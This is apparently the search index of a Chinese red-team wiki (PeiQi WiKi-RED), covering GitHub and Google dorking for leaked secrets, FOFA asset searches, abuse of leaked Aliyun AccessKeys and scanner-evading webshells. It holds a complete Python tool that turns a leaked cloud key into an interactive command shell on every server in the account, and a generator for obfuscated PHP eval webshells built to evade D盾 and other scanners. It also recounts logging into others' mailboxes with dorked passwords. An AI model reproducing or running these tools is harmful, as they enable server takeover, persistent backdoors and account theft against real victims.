{"./":{"url":"./","title":"关于文库","keywords":"","body":"PeiQi WiKi-RED文库🐑 关于文库 这个文库用于整合互联网上关于渗透测试的资料和技巧，与 PeiQI WiKi-POC文库 相似，PeiQI WiKi-RED文库 同样也是开源面向所有人的，大家可以随时在线翻阅或者下载本地搭建🐋 公众号和作者 [!NOTE] 更新的文章都会在第一时间推送在公众号，如果对文库有建议或者想要指出错误，可以扫一扫微信加我好友🐧 关于使用 文库使用的是Gitbook，因为风格比较清新，简洁。于是便选择了它来搭建文库。 目前Wiki文库是开源的，每一个人都可以下载随时翻阅🐬 在线查阅 Github链接 码云链接 [!NOTE] 每个模块都有可用工具，有使用方法和一些技巧 [!NOTE] 部分检测脚本放在POC目录中 如何本地使用 [!NOTE] 1.Github 拉取代码 git clone https://github.com/PeiQi0/PeiQi-WIKI-RED.git git clone https://github.com/PeiQi0/wiki.git 2.下载 gitbook apt install npm npm install gitbook-cli -g 3.打开Wiki的目录下执行 gitbook serve 4.访问 http://localhost:4000 即可 也可以将 _book 作为网站根目录来搭建文库(此目录为已经编译好的html格式) 最后 [!NOTE] 别忘了Github下载完给个小星星⭐ PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-07 21:15:24 "},"TIME.html":{"url":"TIME.html","title":"更新时间线记录","keywords":"","body":"文库更新时间线记录🦌 2021-3-2 防御规避-Webshell免杀-推荐工具-webshell@pureqh 2021-2-7 信息收集-搜索引擎-网络测绘 2021-2-7 信息收集-搜索引擎-Google 2021-2-7 信息收集-搜索引擎-推荐工具-GitDocker 2021-2-5 漏洞挖掘-API密钥泄露-云服务器 Access密钥泄露 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-03-02 12:43:09 "},"PeiQi_WIKI/信息收集/":{"url":"PeiQi_WIKI/信息收集/","title":"信息收集","keywords":"","body":"信息收集 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-31 15:29:55 "},"PeiQi_WIKI/信息收集/搜索引擎/推荐工具/":{"url":"PeiQi_WIKI/信息收集/搜索引擎/推荐工具/","title":"推荐工具","keywords":"","body":"推荐工具 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-07 21:02:04 "},"PeiQi_WIKI/信息收集/搜索引擎/推荐工具/GitDocker/GitDocker.html":{"url":"PeiQi_WIKI/信息收集/搜索引擎/推荐工具/GitDocker/GitDocker.html","title":"GitDocker","keywords":"","body":"GitDocker 工具地址 https://github.com/obheda12/GitDorker 工具简介 GitDorker是一个工具，它利用GitHub Search API和我从各种来源编译来的GitHub dork的广泛列表来提供给定搜索查询下github上存储的敏感信息的概述。 GitDorker的主要目的是为用户提供一个干净且量身定制的攻击面，以开始在GitHub上收集敏感信息。GitDorker可以与其他工具（例如有趣的存储库上的GitRob或Trufflehog）一起使用，或从GitDorker发现的用户使用以产生最佳效果 其中还有速率限制功能 ，GitDorker利用GitHub搜索API，每分钟最多只能请求30个请求。为了防止速率限制，每30个请求后，GitDorker就会内置一个睡眠功能以防止搜索失败。因此，如果要运行带有GitDorker的alldorks.txt文件，该过程大约需要5分钟才能完成。 工具使用 git clone https://github.com/obheda12/GitDorker.git cd GitDorker pip3 install -r requirements.txt 因为是调用API接口，所以还需要在Github创建凭据 创建后将凭据添加入文件 tf/TOKENSFILE 中 [!NOTE] 多个凭据可以让搜索时间减少 常常使用的方法 python3 GitDorker.py -tf tf/TOKENSFILE -q baidu.com -d Dorks/alldorksv3 -o data.txt -q 第一关键字，大部分写为:qq.com baidu.com域名方式 -d 第一关键词 搜索-d指定的文件中的关键词 -e 线程 -o 输出文件 使用内置的大文件搜索结果如图，时间大概 8分钟左右 [!NOTE] 可以根据自己的需求自定义字典快速找到突破口 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-07 21:00:16 "},"PeiQi_WIKI/信息收集/搜索引擎/Google/Google.html":{"url":"PeiQi_WIKI/信息收集/搜索引擎/Google/Google.html","title":"Google","keywords":"","body":"Google 简介 Google作为十分强大的搜索引擎，它能遍历到全球各地的可见网站，为了方便查找网站，还设有一个特殊的语法 Google语法, 对于安全圈，给它取名为 Google Hack。 这是因为在渗透的过程中，巧妙的使用 Google Hack 这样的搜索引擎，我们能快速找到目标的敏感信息泄露和渗透测试中的突破点。 基础 我们从国外的一个知名网站 Exploit-DataBase 来逐步了解 Google Hack 在网站中世界广大的黑客朋友们自发维护的一个汇集着各种已经被优化的查询语句的数据库，每天都在不断地更新，你可以在里面发现一些新的姿势或是一些新的渗透技巧 网站链接: https://www.exploit-db.com/google-hacking-database 我们通过它的语法分类来了解常见的搜索点 1.Footholds 立足点 可帮助攻击者立足于Web服务器的查询语法 2.File Containing Usernames 包含用户名的文件 搜索与账号密码有关的敏感文件 3.Sensitive Directorries 敏感目录 找到一些特定的目录，例如后台或者下载目录 4.Web Server Detection 易被攻击的Web服务 搜索显示具有特定漏洞或特定敏感文件的Web服务。 5.Vulnerable Files 易被攻击的文件 查找可能出现漏洞的文件或者泄露信息的文件 6.Vulnerable Server 出现漏洞的服务 通过特定Url搜寻出现漏洞的服务 7.Error Messages 错误信息 查找Web服务的报错文件或者含有敏感内容的错误信息 8.Files Containing Juicy Info 含有信息的文件 针对目标查找含有敏感信息的文件 9.Files Containing Passwords 含有密码的文件 针对目标查找含有密码的文件 10.Sensitive Online Shopping Info 与购物有关的信息 查找与购物数据有关的信息 11.Network or Vulnerability Data 漏洞点查找 通过语法找到可以出现的漏洞点 12.Pages Containing Login Portals 登录页面 查找包含登录的页面 13.Various Online Devices 网络在线设备 查找网络中的在线设备，例如摄像头,打印机等 14.Advisories and Vulnerabilities 建议与漏洞点 根据语法找一些已经出现漏洞的Web服务 这里的分类主要明确了我们应当用这样的一个搜素引擎做哪些方面的信息收集，例如去寻找某目标的密码信息泄露或者后台登录站点 下面看一下常用的几个搜素词汇 1.intext 搜素匹配文本内容的网站 2.intitle 搜索匹配标题的网站 3.cache 搜索Google中某些内容的缓存 4.filetype 搜索匹配文件类型的网站 5.info 搜索指定站点的某些信息 6.inurl 搜索匹配URL某部分的网站 7.link 搜索某站点响应中的链接 8.site 搜索指定站点的网站 9.ext 搜索指定文件扩展名的网站 这里从 Exploit-DataBase 中拿出几个语句举例子 例子 inurl:https://trello.com AND intext:@163.com AND intext:password 这里的搜索为在 trello平台中搜索使用网易邮箱注册并泄露密码的网页 成功登录网易邮箱 同样的方法可以使用在其他网站上 \"insert into users\" \"VALUES\" ext:sql | ext:txt | ext:log | ext:env 这里是通过关键字后缀和SQL语句来搜寻含有关键字的站点 其他的大家就根据这个谷歌语句集合库和想象力来构造语句来信息挖掘吧 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-02 20:48:45 "},"PeiQi_WIKI/信息收集/搜索引擎/网络测绘/网络测绘.html":{"url":"PeiQi_WIKI/信息收集/搜索引擎/网络测绘/网络测绘.html","title":"网络测绘","keywords":"","body":"FOFA 基础语法 通过标题去查找目标 title=\"OA系统\" 通过搜索根域名查找子域名 domain=\"qq.com\" 这里只拿部分举个例子，更多使用方法参考下表 title=\"beijing\" 从标题中搜索“北京” - header=\"jboss\" 从http头中搜索“jboss” - body=\"Hacked by\" 从html正文中搜索abc - domain=\"qq.com\" 搜索根域名带有qq.com的网站。 - icon_hash=\"-247388890\" 搜索使用此icon的资产。 仅限高级会员使用 host=\".gov.cn\" 从url中搜索”.gov.cn” 搜索要用host作为名称 port=\"443\" 查找对应“443”端口的资产 - ip=\"1.1.1.1\" 从ip中搜索包含“1.1.1.1”的网站 搜索要用ip作为名称 ip=\"220.181.111.1/24\" 查询IP为“220.181.111.1”的C网段资产 - status_code=\"402\" 查询服务器状态为“402”的资产 - protocol=\"https\" 查询https协议资产 搜索指定协议类型(在开启端口扫描的情况下有效) city=\"Hangzhou\" 搜索指定城市的资产。 - region=\"Zhejiang\" 搜索指定行政区的资产。 - country=\"CN\" 搜索指定国家(编码)的资产。 - cert=\"google\" 搜索证书(https或者imaps等)中带有google的资产。 - banner=users && protocol=ftp 搜索FTP协议中带有users文本的资产。 - type=service 搜索所有协议资产，支持subdomain和service两种。 搜索所有协议资产 os=windows 搜索Windows资产。 - server==\"Microsoft-IIS/7.5\" 搜索IIS 7.5服务器。 - app=\"HIKVISION-视频监控\" 搜索海康威视设备 - after=\"2017\" && before=\"2017-10-01\" 时间范围段搜索 - asn=\"19551\" 搜索指定asn的资产。 - org=\"Amazon.com, Inc.\" 搜索指定org(组织)的资产。 - base_protocol=\"udp\" 搜索指定udp协议的资产。 - is_ipv6=true 搜索ipv6的资产 搜索ipv6的资产,只接受true和false。 is_domain=true 搜索域名的资产 搜索域名的资产,只接受true和false。 ip_ports=\"80,161\" 搜索同时开放80和161端口的ip 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据) port_size=\"6\" 查询开放端口数量等于\"6\"的资产 仅限FOFA会员使用 port_size_gt=\"3\" 查询开放端口数量大于\"3\"的资产 仅限FOFA会员使用 port_size_lt=\"12\" 查询开放端口数量小于\"12\"的资产 仅限FOFA会员使用 ip_country=\"CN\" 搜索中国的ip资产(以ip为单位的资产数据)。 搜索中国的ip资产 ip_region=\"Zhejiang\" 搜索指定行政区的ip资产(以ip为单位的资产数据)。 搜索指定行政区的资产 ip_city=\"Hangzhou\" 搜索指定城市的ip资产(以ip为单位的资产数据)。 搜索指定城市的资产 ip_after=\"2019-01-01\" 搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。 搜索2019-01-01以后的ip资产 ip_before=\"2019-07-01\" 搜索2019-07-01以前的ip资产(以ip为单位的资产数据)。 搜索2019-07-01以前的ip资产 目标信息收集 子域名收集 通过图标hash搜索 添加关键字查询资产 使用证书查找资产 搜索常见漏洞组件资产(Weblogic, JBoss, Struts2,Apache-Shiro) host=\".edu.cn\" && (app=\"Oracle-Weblogic_interface_7001\" || app=\"Oracle-BEA-WebLogic-Server\" || title==\"Error 404--Not Found\" || app=\"JBoss\" || app=\"Struts2\" || app=\"Apache-Shiro\" || title=\"OA\" ) FOFA还有很多用法可以自行探索 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-31 21:45:31 "},"PeiQi_WIKI/漏洞挖掘/":{"url":"PeiQi_WIKI/漏洞挖掘/","title":"漏洞挖掘","keywords":"","body":"漏洞挖掘 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-05 13:34:43 "},"PeiQi_WIKI/漏洞挖掘/API密钥泄露/":{"url":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/","title":"API密钥泄露","keywords":"","body":"API密钥泄露 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-05 13:37:55 "},"PeiQi_WIKI/漏洞挖掘/API密钥泄露/云服务器 Access 密钥泄露/云服务器 Access 密钥泄露.html":{"url":"PeiQi_WIKI/漏洞挖掘/API密钥泄露/云服务器 Access 密钥泄露/云服务器 Access 密钥泄露.html","title":"云服务器 Access 密钥泄露","keywords":"","body":"云服务器 AccessKey 密钥泄露 目前为止，云服务器已经占据了服务器的大部分市场，由于云服务器易管理，操作性强，安全程度高。很多大型厂商都选择将资产部署在云服务上，但安全的同时由于运维人员的疏忽也会导致一些非预期的突破口 在阅读下文前我们先简单了解下关于云服务的 AccessKey密钥，我们这里拿 阿里云 举一个例子 登录阿里云账户后点击 AccessKey管理 简单来说这个密钥相当于账户的API调用，具有账户完全的权限 创建后就会生成 AccessKey ID，AccessKey Secret [!NOTE] AccessKeyId：用于标识用户。 AccessKeySecret：用于验证用户的密钥。AccessKeySecret必须保密。 这里我们就创建好了这个密钥，常见的开发过程中就有可能会需要这个密钥，而这个密钥我们通常需要一些信息收集手段拿到这个密钥 [!NOTE] FOFA，Google等搜索引擎 [!NOTE] Github [!NOTE] 部分开发框架的Debug或报错页面 在渗透测试过程中拿到这个密钥后，可以到云服务管理平台获取更多信息 这里我们使用行云管家进行下一步: https://yun.cloudbility.com/ 登录注册后选择对应的厂商服务并写入密钥 接着会扫描账户下的所有服务器，勾选添加点击下一步 这样就会账户下的所有主机添加进去 如下图，已经拥有服务器的管理权限，重启，关闭，改密码都是非常危险的行为 而我们要做到的是控制主机，用其他的平台执行命令是行不通的，所以我们需要调用原生的API来对主机进行命令执行 阿里云API开发链接: https://next.api.aliyun.com/api/Ecs/2014-05-26/RunInstances [!NOTE] pip3 install aliyun-python-sdk-core pip3 install aliyun-python-sdk-ecs 阿里云的 API 中拥有了所有此用户的权限，通过调用API中的方法我们就可以在渗透过程中完成一系列的对主机的操作 简单列举下API调用的思路，然后写API利用脚本 首先获取当前用户下的所有主机信息 调用API DescribeInstances 创建一条需要执行的命令 [!NOTE] 这里我使用的是旧版的API RunCommand 因为一次性返回 CommandId InvokeId 且使用完就删除，不会保留在云助手 再完成回显的查看的API调用 DescribeInvocationResults 更多的功能大家就自行探索啦 这里看一下我写的利用代码的使用 [!NOTE] 扫描地域主机 [!NOTE] Linux主机命令执行 [!NOTE] Windows命令执行 [!NOTE] 反弹shell [!NOTE] 完整代码和所需Python库 pip3 install aliyun-python-sdk-core pip3 install aliyun-python-sdk-ecs #!/usr/bin/env python #coding=utf-8 import json import sys import time from aliyunsdkcore.client import AcsClient from aliyunsdkcore.acs_exception.exceptions import ClientException from aliyunsdkcore.acs_exception.exceptions import ServerException from aliyunsdkecs.request.v20140526.DescribeInstanceStatusRequest import DescribeInstanceStatusRequest from aliyunsdkecs.request.v20140526.DescribeRegionsRequest import DescribeRegionsRequest from aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequest from aliyunsdkecs.request.v20140526.DescribeInvocationResultsRequest import DescribeInvocationResultsRequest from aliyunsdkecs.request.v20140526.RunCommandRequest import RunCommandRequest def Linux_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host): client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host) request = DescribeInstancesRequest() request.set_accept_format('json') InstanceId = [ZhuJi_ID] request.set_InstanceIds(InstanceId) response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') print( \"\"\" \\033[1;31m --------------------------------------------------------------------------------\\033[0m \\033[1;31m - +-------+ \\033[0m \\033[1;31m - | Linux | OS: %s \\033[0m \\033[1;31m - | | --------> IP: %s \\033[0m \\033[1;31m - | | Name: %s \\033[0m \\033[1;31m - +-------+ \\033[0m \\033[1;31m --------------------------------------------------------------------------------\\033[0m \"\"\" % ( json.loads(response)['Instances']['Instance'][0]['OSName'], json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0], json.loads(response)['Instances']['Instance'][0]['InstanceName']) ) while True: Cmd = str(input(\"\\033[5;37m[root@{}] \\033[0m\".format(ZhuJi_ID))) if Cmd == \"exit\": print(\"\\033[1;31m-正在退出主机..... {} \\033[0m\".format(ZhuJi_ID)) break Linux_exec(client, Cmd, ZhuJi_ID) def Linux_exec(client, Cmd, ZHUJI_ID): request = RunCommandRequest() request.set_accept_format('json') request.set_Type(\"RunShellScript\") request.set_CommandContent(Cmd) request.set_InstanceIds([ZHUJI_ID]) request.set_Name(\"PeiQi\") request.set_Description(\"PeiQi\") request.set_Timed(False) response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') CommandId = json.loads(response)['CommandId'] InvokeId = json.loads(response)['InvokeId'] #print(CommandId, InvokeId) time.sleep(1) request = DescribeInvocationResultsRequest() request.set_accept_format('json') request.set_InvokeId(InvokeId) request.set_InstanceId(ZHUJI_ID) request.set_CommandId(CommandId) request.set_ContentEncoding(\"PlainText\") response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') Output = json.loads(response)['Invocation']['InvocationResults']['InvocationResult'][0][\"Output\"] print(\"\\033[1;32m{}\\033[0m\".format(Output)) def Windows_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host): client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host) request = DescribeInstancesRequest() request.set_accept_format('json') InstanceId = [ZhuJi_ID] request.set_InstanceIds(InstanceId) response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') print( \"\"\" \\033[1;31m --------------------------------------------------------------------------------\\033[0m \\033[1;31m - +-------+ \\033[0m \\033[1;31m - |Windows| OS: %s \\033[0m \\033[1;31m - +-------+ --------> IP: %s \\033[0m \\033[1;31m - /_______/ Name: %s \\033[0m \\033[1;31m - \\033[0m \\033[1;31m --------------------------------------------------------------------------------\\033[0m \"\"\" % ( json.loads(response)['Instances']['Instance'][0]['OSName'], json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0], json.loads(response)['Instances']['Instance'][0]['InstanceName']) ) while True: Cmd = str(input(\"\\033[5;37mC:\\Windows\\System32> \\033[0m\".format(ZhuJi_ID))) if Cmd == \"exit\": print(\"\\033[1;31m-正在退出主机 {}..... \\033[0m\".format(ZhuJi_ID)) break Windows_exec(client, Cmd, ZhuJi_ID) def Windows_exec(client, Cmd, ZHUJI_ID): request = RunCommandRequest() request.set_accept_format('json') request.set_Type(\"RunBatScript\") request.set_CommandContent(Cmd) request.set_InstanceIds([ZHUJI_ID]) request.set_Name(\"PeiQi\") request.set_Description(\"PeiQi\") request.set_Timed(False) response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') CommandId = json.loads(response)['CommandId'] InvokeId = json.loads(response)['InvokeId'] #print(CommandId, InvokeId) time.sleep(1) request = DescribeInvocationResultsRequest() request.set_accept_format('json') request.set_InvokeId(InvokeId) request.set_InstanceId(ZHUJI_ID) request.set_CommandId(CommandId) request.set_ContentEncoding(\"PlainText\") response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') Output = json.loads(response)['Invocation']['InvocationResults']['InvocationResult'][0][\"Output\"] print(\"\\033[1;32m{}\\033[0m\".format(Output)) # 可用地域扫描 def Aliyun_City_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET): Aliyun_City = {} client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET) request = DescribeRegionsRequest() request.set_accept_format('json') response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') for i in range(0, 30): try: City_Host = json.loads(response)['Regions']['Region'][i]['RegionId'] City_Name = json.loads(response)['Regions']['Region'][i]['LocalName'] Aliyun_City[City_Name] = City_Host except: print('\\033[1;34m ------ 搜索到有{}个可使用阿里云地域 ------\\033[0m'.format(i)) break return Aliyun_City # 扫描账号下可控主机 def Aliyun_Number_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City): Aliyun_Serve_test_dict = [] InstanceId_List = [] for City in Aliyun_City.keys(): Aliyun_City_Host = Aliyun_City[City] client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host) try: request = DescribeInstanceStatusRequest() request.set_accept_format('json') response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') Aliyun_Num = json.loads(response)['TotalCount'] if Aliyun_Num != 0: print(\"\\033[1;34m 扫描出 {} 共有 {}台云服务器 \\033[0m\".format(City, Aliyun_Num)) for NUM in range(0, int(Aliyun_Num)): InstanceId = json.loads(response)['InstanceStatuses']['InstanceStatus'][NUM]['InstanceId'] Aliyun_Serve_test(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict) InstanceId_List.append(InstanceId) else: print(\"\\033[1;31m 扫描出 {} 共有 {}台云服务器 \\033[0m\".format(City, Aliyun_Num)) except Exception as e: print(\"\\033[1;31m 请求发送失败，请检查 API密钥 \\033[0m\", e) sys.exit(0) print(\"\\033[1;36m 此 AccessKey 下共有 {} 台云服务器 \\n\\033[0m\".format(len(Aliyun_Serve_test_dict))) while True: ZhuJi_ID = str(input(\"\\033[35m 请输入 主机ID 进入服务器：\\n 主机ID >>> \\033[0m\")) if ZhuJi_ID in InstanceId_List: for data in Aliyun_Serve_test_dict: if ZhuJi_ID == data['InstanceId']: Zhuji_Aliyun_City_Host = data['Aliyun_City_Host'] Zhuji_OS = data['OS'] if Zhuji_OS == \"Linux\": Linux_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host) else: Windows_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host) else: print(\"\\033[1;31m 请求发送失败，请检查 主机ID是否正确 \\033[0m\") def Aliyun_Serve_test(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict): client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host) request = DescribeInstancesRequest() request.set_accept_format('json') InstanceId = [InstanceId] request.set_InstanceIds(InstanceId) response = client.do_action_with_exception(request) response = str(response, encoding='utf-8') NUM = int(NUM) + 1 OSName = json.loads(response)['Instances']['Instance'][0]['OSName'] if \"Windows\" in OSName: OS = \"Windows\" else: OS = \"Linux\" IpAddress_1 = json.loads(response)['Instances']['Instance'][0]['VpcAttributes']['PrivateIpAddress']['IpAddress'][0] IpAddress_2 = json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0] InstanceName = json.loads(response)['Instances']['Instance'][0]['InstanceName'] InstanceId = InstanceId[0] Aliyun_Serve_test_dict.append({ \"InstanceId\": InstanceId, \"Aliyun_City_Host\": Aliyun_City_Host, \"OS\":OS }) # Aliyun_Serve_test_dict[\"InstanceId\"] = InstanceId # Aliyun_Serve_test_dict[\"Aliyun_City_Host\"] = Aliyun_City_Host # Aliyun_Serve_test_dict[\"OS\"] = OS print(\"\\033[1;34m ({}) 主机ID: {} 系统名称: {} \\n 外网IP： {}\\n 内网IP： {} \\n 服务器名: {}\\n \\033[0m\".format(NUM, InstanceId, OSName, IpAddress_2, IpAddress_1, InstanceName)) if __name__ == '__main__': ALIYUN_ACCESSKEYID = \"xxxxxxxxxxxxx\" ALIYUN_ACCESSKEYSECRET = \"xxxxxxxxxxxxxxxxxxxxxx\" Aliyun_City = Aliyun_City_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET) InstanceId_List = Aliyun_Number_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City) 常见的 Access Key名称 阿里云 ALIYUN_ACCESSKEYID ALIYUN_ACCESSKEYSECRET 腾讯云 SecretId SecretKey AWS AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY 青云 qy_access_key_id qy_secret_access_key 参考的文章:https://www.freebuf.com/articles/web/255717.html PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-05 12:49:38 "},"PeiQi_WIKI/防御规避/":{"url":"PeiQi_WIKI/防御规避/","title":"防御规避","keywords":"","body":"防御规避 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-05 14:39:28 "},"PeiQi_WIKI/防御规避/Webshell免杀/":{"url":"PeiQi_WIKI/防御规避/Webshell免杀/","title":"Webshell免杀","keywords":"","body":"Webshell免杀 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-05 14:40:08 "},"PeiQi_WIKI/防御规避/Webshell免杀/推荐工具/":{"url":"PeiQi_WIKI/防御规避/Webshell免杀/推荐工具/","title":"推荐工具","keywords":"","body":"推荐工具 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-02-07 21:02:04 "},"PeiQi_WIKI/防御规避/Webshell免杀/推荐工具/Webshell免杀/Webshell免杀.html":{"url":"PeiQi_WIKI/防御规避/Webshell免杀/推荐工具/Webshell免杀/Webshell免杀.html","title":"Webshell@pureqh","keywords":"","body":"Webshell免杀 工具地址 https://github.com/pureqh/webshell 工具简介 免杀webshell生成工具 工具使用 PHP免杀 [!NOTE] php_webshell.py import random #author: pureqh #github: https://github.com/pureqh/webshell #use:GET:http://url?pass=pureqh POST:zero shell = '''{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy'; $this->{3} = @{9}($this->{2}); @eval({5}.$this->{3}.{5}); {4}{4}{4} new {0}(); function {6}(${7}){1} $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567'; ${8} = ''; $v = 0; $vbits = 0; for ($i = 0, $j = strlen(${7}); $i = 5) {1} $vbits -= 5; ${8} .= $BASE32_ALPHABET[$v >> $vbits]; $v &= ((1 0){1} $v = 'a' && ${7}[$i] = '2' && ${7}[$i] = 8){1} $vbits -= 8; ${8} .= chr($v >> $vbits); $v &= ((1 ''' def random_keys(len): str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' return ''.join(random.sample(str,len)) def random_name(len): str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' return ''.join(random.sample(str,len)) def build_webshell(): className = random_name(4) lef = '''{''' parameter1 = random_name(4) parameter2 = random_name(4) rig = '''}''' disrupt = \"\\\"/*\"+random_keys(7)+\"*/\\\"\" fun1 = random_name(4) fun1_vul = random_name(4) fun1_ret = random_name(4) fun2 = random_name(4) shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2) return shellc if __name__ == '__main__': print (build_webshell()) 免杀效果 测试时间 2021-3-2 [!NOTE] D盾 作者表明下列代码已被记录所以无法绕过 if(md5($_GET[\"pass\"])==\"df24bfd1325f82ba5fd3d3be2450096e\") [!NOTE] 河马查杀 [!NOTE] WEBDIR+ 后续作者重新写入文件 php_D_webshell.py 用于专门绕过 D盾 import random #author: pureqh #github: https://github.com/pureqh/webshell #use: POST:zero shell = '''{2} = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy'; $this->{3} = @{9}($this->{2}); @eval({5}.$this->{3}.{5}); {4}{4} new {0}(); function {6}(${7}){1} $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567'; ${8} = ''; $v = 0; $vbits = 0; for ($i = 0, $j = strlen(${7}); $i = 5) {1} $vbits -= 5; ${8} .= $BASE32_ALPHABET[$v >> $vbits]; $v &= ((1 0){1} $v = 'a' && ${7}[$i] = '2' && ${7}[$i] = 8){1} $vbits -= 8; ${8} .= chr($v >> $vbits); $v &= ((1 ''' def random_keys(len): str = '`~-=!@#$%^&_+?<>|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' return ''.join(random.sample(str,len)) def random_name(len): str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' return ''.join(random.sample(str,len)) def build_webshell(): className = random_name(4) lef = '''{''' parameter1 = random_name(4) parameter2 = random_name(4) rig = '''}''' disrupt = \"\\\"/*\"+random_keys(7)+\"*/\\\"\" fun1 = random_name(4) fun1_vul = random_name(4) fun1_ret = random_name(4) fun2 = random_name(4) shellc = shell.format(className,lef,parameter1,parameter2,rig,disrupt,fun1,fun1_vul,fun1_ret,fun2) return shellc if __name__ == '__main__': print (build_webshell()) 其他免杀使用方法类似，自行测试，目前可过大部分普通查杀安全设备 PeiQi WiKi-RED文库 all right reserved，powered by Gitbook文件更新时间： 2021-03-02 15:46:35 "}}